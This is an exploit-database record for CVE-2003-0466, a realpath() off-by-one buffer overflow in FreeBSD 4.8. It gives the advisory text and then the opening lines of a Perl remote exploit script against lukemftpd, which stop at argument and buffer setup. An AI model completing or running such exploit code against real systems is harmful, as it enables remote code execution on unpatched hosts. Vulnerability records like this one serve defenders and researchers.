    "text": "ecve : CVE-2003-0466 ， title : FreeBSD 4.8 - 'realpath (  ) ' Off-by-One Buffer Overflow - FreeBSD remote Exploit ， verified : Verified ， exploit_detail : source :  ， The 'realpath (  ) ' function is a C-library procedure to resolve the canonical , absolute pathname of a file based on a path that may contain values such as '/' , './' , '../' , or symbolic links. A vulnerability that was reported to affect the implementation of 'realpath (  ) ' in WU-FTPD has lead to the discovery that at least one implementation of the C library is also vulnerable. FreeBSD has announced that the off-by-one stack- buffer-overflow vulnerability is present in their libc. Other systems are also likely vulnerable. ， Reportedly , this vulnerability has been successfully exploited against WU-FTPD to execute arbitrary instructions. ， NOTE : Patching the C library alone may not remove all instances of this vulnerability. Statically linked programs may need to be rebuilt with a patched version of the C library. Also , some applications may implement their own version of 'realpath (  ) '. These applications would require their own patches. FreeBSD has published a large list of applications that use 'realpath (  ) '. Administrators of FreeBSD and other systems are urged to review it. For more information , see the advisory 'FreeBSD-SA-03 : 08.realpath'. ，  #  ! /usr/bin/perl ，  # realpath lukemftpd remote exploit for freeBSD 4.8 ，  # i managed to code this , and lose the first copy , hence a re-write :  (  ，  # deadbeat ,  ，  # left without any return addresses/offsets purposely to stop kids using it.. ，  # want the rets/offsets? heh.. ，  # tested on freeBSD 4.8 and it worked ;  ) it worked ;  )  ，  # e : daniels @ legend.co.uk ，  # e : deadbeat @ sdf.lonestar.org ， use IO :  : Socket ;  ，  $ user = $ ARGV [ 0 ]  ;  ，  $ pass = $ ARGV [ 1 ]  ;  ，  $ ret = $ ARGV [ 2 ]  ;  ，  $ offset = $ ARGV [ 3 ]  ;  ，  $ host = $ ARGV [ 4 ]  ;  ，  $ buf= 1024 ;  ，  $ n = \"./\" ; ",
